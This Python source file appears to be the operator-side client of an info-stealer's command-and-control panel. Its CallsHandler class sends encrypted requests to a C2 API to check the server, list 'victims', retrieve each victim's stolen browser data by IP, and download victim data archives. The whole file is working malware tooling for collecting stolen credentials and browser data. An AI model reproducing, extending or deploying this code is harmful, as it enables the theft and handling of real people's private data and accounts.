import requests
import json
from models.CryptoCore import CryptoCore


class CallsHandler(CryptoCore):
    ip = None
    port = None
    url = None

    def IsUP(self) -> bool:
        self.url = f"http://{self.ip}:{self.port}"
        TestMessage = self.EncryptBuffer("Are you ready?")
        header = {"cc": TestMessage}
        url = self.url + "/check"
        try:
            response = requests.get(url=url, headers=header, timeout=5)

            if response.status_code == 200:
                return True
            else:
                print("[-] Incorrect cryptographic parameters. You should verify that the used parameters are the same ones on the api.")
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            print("[-] The API is not reachable.")

        return False

    def GetVictims(self) -> dict:
        url = self.url + "/GetAll"
        try:
            response = requests.get(url=url)

            data = self.DecryptBuffer(response.text).decode("utf-8")
            return json.loads(data)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            print("[-] The API is not reachable.")

        return None

    def GetVictimBrowsersData(self, VictimIP) -> dict:
        data = ""
        url = self.url + "/GetVictimData"
        ip = self.EncryptBuffer(VictimIP)
        header = {"TARGET": ip}
        try:
            response = requests.get(url=url, headers=header, stream=True)

            if response.status_code == 200:
                for chunk in response.iter_content(chunk_size=102400):
                    if chunk:
                        data += chunk.decode("utf-8")

                data = self.DecryptBuffer(data).decode("utf-8")
                return json.loads(data)

            elif response.status_code == 204:
                print("[-] The victim does not exists.")
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            print("[-] The API is not reachable.")

        return None

    def GetVictimData(self, VictimIP) -> bytes:
        data = ""
        url = self.url + "/down"
        ip = self.EncryptBuffer(VictimIP)
        header = {"TARGET": ip}
        try:
            response = requests.get(url=url, headers=header, stream=True)

            if response.status_code == 200:
                for chunk in response.iter_content(chunk_size=102400):
                    if chunk:
                        data += chunk.decode("utf-8")
                return self.DecryptBuffer(data)

            elif response.status_code == 204:
                print("[-] The victim does not exists.")
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            print("[-] The API is not reachable.")

        return None
